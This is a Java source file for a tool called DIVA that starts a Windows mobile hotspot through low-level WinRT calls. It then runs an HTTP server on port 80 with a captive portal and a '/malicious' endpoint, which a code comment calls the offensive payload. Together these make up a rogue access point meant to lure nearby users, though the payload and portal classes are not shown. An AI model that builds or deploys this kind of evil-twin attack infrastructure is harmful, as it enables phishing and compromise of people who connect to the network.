package com.diva.diva;

import com.sun.jna.*;
import com.sun.jna.platform.win32.Guid.GUID;
import com.sun.jna.ptr.*;
import com.sun.jna.win32.StdCallLibrary;
import com.sun.net.httpserver.HttpServer;
import java.net.InetSocketAddress;

public class DIVA {

    public static void main(String[] args) throws Exception {
        if (!Platform.isWindows()) return;
        HttpServer server = HttpServer.create(new InetSocketAddress("0.0.0.0", 80), 0);
        PortalCautivo.registrar(server);
        server.createContext("/malicious", new DivaMalicious()); // Registro del payload ofensivo

        try {
            Hotspot.activar();
            server.start();
            System.out.println("DIVA activo (HTTP:80, DNS:53).");
        } catch (Exception | LinkageError e) {
            server.stop(0);
            System.err.println("Error: " + e.getMessage());
        }
        Runtime.getRuntime().addShutdownHook(new Thread(() -> server.stop(0)));
    }

    static class Hotspot {
        private static final WinAPI API = Native.load("combase", WinAPI.class);

        static void activar() throws InterruptedException {
            check(API.RoInitialize(1));
            try (Objeto red = fab("Windows.Networking.Connectivity.NetworkInformation", "5074F851-950D-4165-9C15-365619481EEA");
                 Objeto perf = red.obj(7);
                 Objeto fab = fab("Windows.Networking.NetworkOperators.NetworkOperatorTetheringManager", "5B235412-35F0-49E7-9B08-16D278FBAA42")) {

                if (fab.num(6, perf.ptr) != 0) throw new IllegalStateException("Conexión no compartible.");

                try (Objeto g = fab.obj(7, perf.ptr)) {
                    if (g.num(8) == 1) return;
                    try (Objeto op = g.obj(11);
                         Objeto pr = op.obj(0, new GUID("00000036-0000-0000-C000-000000000046"))) {
                        esperar(pr);
                        try (Objeto r = op.obj(8)) {
                            int c = r.num(6);
                            if (c != 0 && c != 9) throw new IllegalStateException("Error activación: " + c);
                        }
                    }
                }
            } finally { API.RoUninitialize(); }
        }

        static void esperar(Objeto pr) throws InterruptedException {
            long lim = System.nanoTime() + 30_000_000_000L;
            while (pr.num(7) == 0) {
                if (System.nanoTime() >= lim) throw new IllegalStateException("Timeout 30s.");
                Thread.sleep(100);
            }
            if (pr.num(7) != 1) throw new IllegalStateException("Incompleto.");
        }

        static Objeto fab(String cls, String id) {
            PointerByReference n = new PointerByReference(), r = new PointerByReference();
            check(API.WindowsCreateString(new WString(cls), cls.length(), n));
            try {
                check(API.RoGetActivationFactory(n.getValue(), new GUID(id), r));
                return new Objeto(r.getValue());
            } finally { API.WindowsDeleteString(n.getValue()); }
        }

        static void check(int c) { if (c < 0) throw new IllegalStateException(String.format("Error 0x%08X", c)); }

        static class Objeto implements AutoCloseable {
            final Pointer ptr;
            Objeto(Pointer p) { if (p == null) throw new IllegalStateException("Null ptr"); this.ptr = p; }

            int call(int idx, Object... p) {
                Object[] a = new Object[p.length + 1];
                a[0] = ptr;
                System.arraycopy(p, 0, a, 1, p.length);
                return Function.getFunction(ptr.getPointer(0).getPointer((long) idx * Native.POINTER_SIZE), Function.ALT_CONVENTION).invokeInt(a);
            }

            Objeto obj(int idx, Object... p) {
                PointerByReference r = new PointerByReference();
                Object[] a = java.util.Arrays.copyOf(p, p.length + 1);
                a[p.length] = r;
                check(call(idx, a));
                return new Objeto(r.getValue());
            }

            int num(int idx, Object... p) {
                IntByReference r = new IntByReference();
                Object[] a = java.util.Arrays.copyOf(p, p.length + 1);
                a[p.length] = r;
                check(call(idx, a));
                return r.getValue();
            }

            @Override public void close() { call(2); }
        }
    }

    public interface WinAPI extends StdCallLibrary {
        int RoInitialize(int t);
        void RoUninitialize();
        int WindowsCreateString(WString s, int l, PointerByReference r);
        int WindowsDeleteString(Pointer s);
        int RoGetActivationFactory(Pointer c, GUID i, PointerByReference r);
    }
}